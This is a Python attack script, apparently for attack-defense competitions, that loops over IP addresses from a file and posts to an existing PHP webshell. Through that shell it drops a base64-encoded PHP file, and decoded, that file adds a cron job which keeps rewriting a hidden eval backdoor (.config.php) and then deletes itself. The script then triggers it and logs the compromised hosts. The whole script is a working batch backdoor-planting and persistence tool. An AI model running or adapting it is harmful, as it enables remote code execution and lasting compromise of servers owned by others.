#coding=utf-8
import requests
import re
shell_addr="/shell.php"
passwd="cmd"                    #木马密码
port="99"

payload =  {passwd: 'file_put_contents(\'info.php\',base64_decode(\'PD9waHAgDQpzeXN0ZW0oJ2VjaG8gIiogKiAqICogKiBlY2hvIFwiPD9waHAgIGlmKG1kNShcXFxcXFwkX0dFVFtwYXNzXSk9PVwnODM1YWVkZWNlMGE5MGQ0NWE1Y2NlM2E3MjVhOGU5N2NcJyl7QGV2YWwoXFxcXFxcJF9QT1NUW2NtZF0pO30gIFwiID4gL3d3dy93d3dyb290L2hlbGxsby5jb20vLmNvbmZpZy5waHAiIHwgY3JvbnRhYjt3aG9hbWknKTsgIA0KQHVubGluayhfX0ZJTEVfXyk7\'));'}
#shell密码 shuyu
ippath="ip.txt"
pattern = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
iptables = ""
with open(ippath, 'r') as file_to_read:
    while True:
        lines = file_to_read.readline() 
        if not lines:
            break
            pass
        iptables+=lines  
#print(iptables)
iplist=pattern.findall(iptables)

#密码cmd-路径是config点php
#
flag=open("config_php_passwd_cmd.txt","a")

for ip in iplist:
    url="http://"+ip+":"+port+shell_addr
    #print(url)
    try:
        res=requests.post(url,payload,timeout=1)
        #print(res)
        if res.status_code == requests.codes.ok:
            result = url+" write nodie correct ,passwd is cmd path is ./config.php "
            print(result,end="")
            flag.write(ip+"\n")
        else:
            print ("shell 404")
    except Exception as e:
        print(url+" connect shell fail")
        raise e
    try:
        requests.get("http://"+ip+":"+port+"/info.php",timeout=1)
        print("激活成功")
    except Exception as e:
        print("激活成功")

flag.close()